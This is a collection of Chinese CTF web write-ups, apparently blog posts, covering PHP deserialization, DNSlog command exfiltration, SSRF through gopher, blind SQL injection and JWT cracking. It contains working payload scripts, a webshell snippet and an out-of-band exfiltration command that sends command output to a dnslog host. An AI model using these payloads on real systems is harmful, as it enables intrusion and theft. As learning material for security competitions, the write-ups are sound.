[{"title":"CTFHub_2020-网鼎杯-青龙组-AreUserialz","url":"/2023/04/07/CTFHub-2020-网鼎杯-青龙组-AreUserialz/","content":"\n题目上来直接展示源码：\n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n\n经过分析得知基本流程为定义op为操作数，1为写2为读，在读中分析，首先字符串通过GET以str引入，首先进行is_valid判断，判断是否存在不可打印字符，之后进行反序列化，在process函数中判断op为2调用read函数，读取文件名为变量filename的文件，将返回值赋值给res变量并调用output函数进行输出。\n\ndestruct魔术方法中会自动将op值由2转换为1，但比较类型为强比较，process函数中为弱类型比较，因此传入数字2即可绕过。\n\n构造对应脚本：\n\n```php\n<?php\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $this -> op = 2;\n        $this -> filename = \"flag.php\";\n        // $this -> content = \"Hello World!\";\n    }\n}\n$a = new FileHandler;\necho(urlencode(serialize($a)));\n?>\n```\n\n发现无任何回显，仔细观察流程发现由于类中的变量属性类型为**protected** ，因此序列化后形如：\n\n![protected](image-20230407210544120.png)\n\n发现在变量名称前出现了%00*%00，无法通过is_valid函数（同样的还有private属性类型，形式为%00类名%00字段名），这里有个小trick：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可\n\n```php\n<?php\nclass FileHandler {\n\n    public $op;\n    public $filename;\n    public $content;\n\n    function __construct() {\n        $this -> op = 2;\n        $this -> filename = \"flag.php\";\n        // $this -> content = \"Hello World!\";\n    }\n}\n$a = new FileHandler;\necho(urlencode(serialize($a)));\n?>\n```\n\n\n\n传入即可拿到flag。\n","tags":["CTF_解题记录"]},{"title":"CTFHub_2022-网鼎杯-朱雀组-phpweb","url":"/2023/04/07/CTFHub-2022-网鼎杯-朱雀组-phpweb/","content":"\n题目上来看到一张背景图，左上角显示实时时间，每5s刷新一次，通过burp查看POST传入了\n\n> func=date&p=Y-m-d%20h%3Ai%3As%20a\n\n猜测第一参数为php函数，第二参数为传入函数的参数。\n\n之后进行fuzz工作，发现ban掉了很多函数，像system、exec等函数均被ban掉，偶然发现highlight_file函数使用正常，可以借助此函数进行源码读取，传入\n\n> func=highlight_file&p=index.php\n\n成功拿到index.php的源码：\n\n```php\n<?php\n$disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\n\t\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",\n\t\"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\n\t\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"\n);\nfunction gettime($func, $p) {\n\t$result = call_user_func($func, $p);\n\t$a= gettype($result);\n\tif ($a == \"string\") {\n\treturn $result;\n\t} else {\n\treturn \"\";\n\t}\n}\nclass Test {\n\tvar $p = \"Y-m-d h:i:s a\";\n\tvar $func = \"date\";\n\tfunction __destruct() {\n\tif ($this->func != \"\") {\n\t\techo gettime($this->func, $this->p);\n\t}\n\t}\n}\n$func = $_REQUEST[\"func\"];\n$p = $_REQUEST[\"p\"];\nif ($func != null) {\n\t$func = strtolower($func);\n\tif (!in_array($func,$disable_fun)) {\n\techo gettime($func, $p);\n\t}else {\n\tdie(\"Hacker...\");\n\t}\n}\n?>\n```\n\n可以看到函数黑名单，审计发现可以利用Test类中的__destruct()魔术方法进行命令执行，从此逆推需要一个反序列化函数进行触发，发现unserialize函数不在黑名单中，可以利用，下面构造相应脚本：\n\n```php\n<?php\nclass Test {\n\tvar $p = \"cat /flag*\";\n\tvar $func = \"system\";\n}\n$a = new Test;\necho(urlencode(serialize($a)));\n?>\n```\n\n最终payload：\n\n> func=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A8%3A%22cat+%2Ffl%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n\n![flag](./image-20230407193913985.png)\n\n成功拿到flag。\n\n\n\n（加上解题记录要不没得写了qwq\n\n","tags":["CTF_解题记录"]},{"title":"VishwaCTF 2023 Web","url":"/2023/04/06/VishwaCTF-2023-Web/","content":"\n# Eeezzy\n\n题目上来直接给源码：\n\n![Eeezzy](./Eeezzy.png)\n\n利用了strcmp函数无法比较数组等其他类型的参数，因此传入数组会使函数出错退出返回NULL。当时同时构造username和password以数组形式传入仅仅只会报错，后来看别人wp发现需要只构造password以数组形式传入才能拿到wp？（一个坑点，本地环境测试两个都构造为数组形式也能拿到flag，后续有研究再补充）\n\n# aLive\n\n![alive题面](./image-20230406212435517.png)\n\n题面顾名思义，使用dnslog工具平台将命令外带，类似于requestbin\n\n![dnslog](./image-20230406213229616.png)\n\n如此，可通过如下构造将命令执行的结果进行外带：\n\n```she\n`whoami`.ks8zy9.dnslog.cn\n```\n\n![dnslog测试](./image-20230406213442239.png)\n\n```shell\n`cat flag*`.ks8zy9.dnslog.cn\n```\n\n拿到flag。\n\n# payload\n\n用dirsearch扫目录，能扫出robots.txt和一个奇怪的GET传参cmd的子目录（之后发现就是要传参cmd）,robots.txt内容：\n\n```php\n<?php\n    if(isset($_GET['cmd'])){\n        system($_GET['cmd']);\n    }\n    else {\n        if(isset($_GET['btn'])){\n            echo \"<b>System Details: </b>\";\n            system(\"uname -a\"); \n        }\n    }\n?>\n\n```\n\n之后测了很多，以为是ssrf之类的，fuzz发现屏蔽了一些系统函数，写webshell也会被自动清空。。。结果flag直接藏在环境变量里，使用命令env查看系统环境变量即可。\n\n![cmd=env](./image-20230406210722466.png)\n\n# spooky\n\n题目上来是个登录界面，使用dirsearch扫一遍目录，发现有一个sitemap.xml文件，文件包含两个文件的路径：\n\n- /creds/users.txt\n- /creds/pass.txt\n\n两个文件分别是一些用户名和密码，对应关系未知，使用burp的intruder模块的cluster bomb模式构造用户名和密码的笛卡尔积并爆破\n\n爆破发现shrekop用户能登陆成功，但权限等级为user，POST传入admin=true即可拿到flag\n\n\n\n### 写在最后\n\n赛后看题解真的不难。。。怎么比赛时候就短路？做题还是少\n","tags":["CTF_比赛记录"]},{"title":"2023数字中国数字人才赛道初赛WEB","url":"/2023/04/02/2023数字中国数字人才赛道初赛WEB/","content":"\n\n\n比赛时间在博客建站之前，题目没有自己截的图，在网上找了几张。\n\n# easy_curl\n\n首先通过php伪协议读取源文件\n\n``` \n?url=file:///var/www/html/index.php\n```\n\n得到index.php源码：\n\n![index.php源码](./image-20230402195715364.png)\n\n同理得到flag.php源码：\n\n![flag.php源码](./image-20230402195821748.png)\n\n通过源码分析可以得到基本逻辑，index.php负责进行过滤和curl访问，flag.php输出变量key和检测访问是否来源于本地，如果是则输出flag。\n\n题目重点在于：\n\n- gophar协议构造http请求\n\n- index.php对内网地址的过滤\n\n## gophar协议构造http请求：\n\n### 构造GET请求：\n\n使用脚本：\n\n```python\nimport urllib\ntest =\\\n\"\"\"GET /ssrf/get.php HTTP/1.1\nHost: 192.168.0.111\n\"\"\"  \ntmp = urllib.parse.quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://sudo.cc:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)\n```\n\n### 构造POST请求：\n\n包格式与GET不同，需要额外提供请求头Contennt-Type与Content-Length\n\n```python \nimport urllib.parse\npayload =\\\n\"\"\"POST /flag.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nkey=4208252604f16d7ed834c6bfceb54440\n\"\"\"  \ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://sudo.cc:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)       # 这里因为是GET请求所以要进行两次url编码\n```\n\n尤其要注意二次编码问题，因为最终利用index.php的curl时仍要urlencode\n\n## 本地地址过滤绕过\n\n正则表达式过滤了 **localhost、127.0开头的字符串以及中文句号。** 因此可以进行进制转换，例如127.0.0.1转换十进制为 2130706433，进行请求等同于127.0.0.1.\n\n另外一种方法可以访问**sudo.cc**，此域名在经过解析后为127.0.0.1，同样可以进行过滤绕过。\n\n最终payload：\n\n```\nhttp://80.endpoint-453973b83c7545d5a12aef2756506771.s.ins.cloud.dasctf.com:81/?url=gopher://2130706433:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%36%32%25%33%35%25%33%30%25%33%30%25%33%38%25%36%36%25%33%32%25%33%36%25%33%38%25%36%35%25%36%31%25%36%33%25%36%31%25%33%36%25%36%36%25%33%38%25%33%30%25%36%33%25%36%36%25%33%33%25%33%32%25%36%35%25%33%32%25%33%32%25%33%34%25%33%38%25%33%37%25%33%35%25%33%31%25%33%38%25%36%36%25%33%39\n```\n\n# Simple Message Board\n\nSQL注入，首先使用burp进行fuzz，发现substring函数被ban，使用left函数代替，left函数语法：\n\n```sql\nLEFT(str,length);\n```\n\n函数返回指定长度的字符串的左侧部分。\n\n经过测试注入点在search面板中，贴一个别人的脚本：\n\n```python\nimport requests,string\nurl = \"http://80.endpoint-8c456a973f5a40b1ad419af58b263ad3.s.ins.cloud.dasctf.com:81/index.php?act=search\"\nres =\"\"\nprint(string.printable)\nfor i in range(1,100):\n    print(i)\n    for j in \"0123456789abcdefghijklmnopqrstuvwxyz{}-\":\n        tmp=res\n        tmp+=j\n        payload1 = \"-1'||if((left((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{})='{}'),1,0)#\".format(str(i),tmp)\n        payload1 = \"-1'||if((left((select*from(flag)),{})='{}'),1,0)#\".format(str(i),tmp)\n        #print(payload1)\n        #payload2 = \"admin'^(ascii(mid(database()from {}))>{})^1%23\".format(i,j)\n        data = {\"keyword\":payload1}\n        r = requests.post(url,data=data)\n        if \"Message:Hello, world!\"  in r.text:\n            res=tmp\n            print (res)\n            break\n        if \"What are you doing?\" in r.text:\n            print('Baned!')\n            exit()\n```\n\n脚本核心使用left函数对select到的内容进行截取，通过遍历的方式匹配到正确的字符。\n\n# 三体信息破译\n\n注册账号，在burp中能够看到cookie为jwt格式，在头部中可以看到加密方式为hs256，考虑进行暴力破解（没想到真能破解出来），使用工具c-jwt-cracker进行破解，docker运行\n\n```docker\ndocker run -it --rm jwtcrack [完整的jwt格式的一个样本]\n```\n\n得到密码为**izihz**\n\n登陆后会看到一长串关于网络安全的定义，很长所以很容易被人忽略（多用ctrl+f搜索一下关键词例如flag、hint之类，很有可能藏在看似无用的内容中），发现hint为使用用户名为“yewenjie”的用户进行登录，而jwt中有用户名字段：\n\n![JWT内容](./image-20230402210218768.png)\n\n将username改为yewenjie后利用破解出的密钥重新生成签名登录即可获得flag。\n\n## 写在最后：\n\n真的菜，差距真的大，多参加比赛，多刷题！\n\n","tags":["CTF_比赛记录"]}]